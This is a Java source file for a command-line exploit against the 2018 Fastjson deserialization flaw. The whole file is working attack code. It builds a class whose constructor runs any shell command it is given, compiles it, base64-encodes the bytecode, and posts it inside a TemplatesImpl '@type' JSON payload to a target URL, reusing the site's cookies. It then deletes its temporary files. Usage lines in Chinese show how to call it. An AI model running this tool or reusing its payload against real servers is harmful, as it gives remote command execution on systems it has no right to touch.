import sun.misc.BASE64Encoder;

import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.StandardJavaFileManager;
import javax.tools.ToolProvider;
import java.io.*;
import java.lang.reflect.Array;
import java.net.URL;
import java.net.URLConnection;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@SuppressWarnings("all")
public class fastjsonRce2018 {

    public static void payloadTest(String url,String cookies,String payload) {
        PrintWriter out = null;
        BufferedReader in = null;
        URL realUrl;
        URLConnection conn;
        try {
            if(cookies.equals("null")){
                try{
                    URL accessUrl = new URL(url);
                    URLConnection connTest = accessUrl.openConnection();
                    Map<String,List<String>> headers = connTest.getHeaderFields();
                    List<String> setCookie = headers.get("Set-Cookie");

                    for(String str:setCookie){
                        System.out.println(str.substring(0,str.indexOf(";") + 1));
                        cookies += str.substring(0,str.indexOf(";") + 1) + " ";
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    System.out.println("Cookies Error : " + e);
                }
            }

            realUrl = new URL(url);
            conn = realUrl.openConnection();

            //设置头部信息
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Cookie", cookies);
            //发送POST请求必须的两行代码
            conn.setDoOutput(true);
            conn.setDoInput(true);

            // 获取输出流
            out = new PrintWriter(conn.getOutputStream());
            //发送参数
            String payloads = "{\"name\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\""+
                    payload +
                    "\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"},age:12}";
            //System.out.println(payloads);
            out.print(payloads);
            //flush 输出流
            out.flush();

            //读取服务器返回的内容
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            String resultContent = "";
            while ((line = in.readLine()) != null) {
                resultContent += line;
            }
            System.out.println(resultContent);
        } catch (Exception e) {
            //System.out.println("[+]发送 POST 请求出现异常！\n" + e);
            System.out.println("[+] 测试成功");
            System.out.println(e);
        }
        finally {
            try{
                if(out != null){
                    out.close();
                }
                if(in != null){
                    in.close();
                }
            }catch (IOException ex){
                ex.printStackTrace();
                System.out.println("输入输出流关闭异常：" + ex);
            }
        }
    }

    public static void paylaodFile(String cmd){
        String paylaod = "" +
                "import com.sun.org.apache.xalan.internal.xsltc.DOM;\n" +
                "import com.sun.org.apache.xalan.internal.xsltc.TransletException;\n" +
                "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
                "import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\n" +
                "import com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n" +
                "import java.io.IOException;\n" +
                "public class payload extends AbstractTranslet {\n" +
                "    public payload() throws IOException {\n" +
                "        Runtime.getRuntime().exec(\"" +
                cmd + "\"" +
                ");\n" +
                "    }\n" +
                "    @Override\n" +
                "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {\n" +
                "    }\n" +
                "    @Override\n" +
                "    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException {\n" +
                "    }\n" +
                "    public static void main(String[] args) throws Exception {\n" +
                "        payload t = new payload();\n" +
                "    }\n" +
                "}";

        try{
            File paylaodFs = new File("payload.java");
            paylaodFs.createNewFile();
            FileWriter fsWrite = new FileWriter(paylaodFs);
            BufferedWriter out = new BufferedWriter(fsWrite);
            out.write(paylaod);
            out.flush();    //将内容写入文件
            out.close();
            fsWrite.close();
        }catch (Exception e){
            //no deal
            e.printStackTrace();
        }
    }

    public static void compilerPayload(){

        System.out.println("[+] Compilering ... ...");
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        StandardJavaFileManager fileManager = compiler.getStandardFileManager(null,null,null);
        File file = new File("payload.java");
        Iterable<? extends JavaFileObject> compilationUnits = fileManager.getJavaFileObjects(file);
        JavaCompiler.CompilationTask task = compiler.getTask(null,fileManager,null,null,null,compilationUnits);
        task.call();
        System.out.println("[+] Compiler finish ... ...");

    }

    public static String base64Encode(){
        File file = new File("payload.class");
        long length = file.length();
        //System.out.println("paylaod.calss size : " + length);
        String payloadBase64 = "";
        byte[] buffer = new byte[(int)length];
        int len = 0;
        int index = 0;
        try{
            InputStream input = new FileInputStream("payload.class");
            while ((len = input.read()) != -1){
                buffer[index] = (byte) len;
                index++;
            }
            input.close();  //关闭文件流

        }catch (Exception e){
            System.out.println("[+] Read payload.class Error\n" + e);
            e.printStackTrace();
        }

        BASE64Encoder encoder = new BASE64Encoder();
        payloadBase64 = encoder.encode(buffer);
        //System.out.print(payloadBase64);
        //base64编码后有换行符导致payload无效，需要将其去掉
        Pattern p = Pattern.compile("\\s*|\t|\r|\n");
        Matcher m = p.matcher(payloadBase64);
        payloadBase64 = m.replaceAll("");

        return payloadBase64;
    }

    public static void main(String[] args){

        System.out.println("" +
                "【+】无Cookie情况下：\n" +
                "e.g : fastjson-2018-Rce.jar http://attackServer/test/test/ null \"ping www.baidu.com\" \n" +
                "【+】有Cookie情况下：\n" +
                "e.g : fastjson-2018-Rce.jar http://attackServer/test/test/ cookies \"ping www.baidu.com\"");
        String url = args[0];
        String cookies = args[1];
        String cmd = args[2];

        paylaodFile(cmd);
        compilerPayload();
        String payload = base64Encode();
        payloadTest(url,cookies,payload);
        //删除payload.java文件
        File tmp1 = new File("payload.java");
        tmp1.delete();
        //删除payload.class文件
        File tmp2 = new File("payload.class");
        tmp2.delete();
    }
}
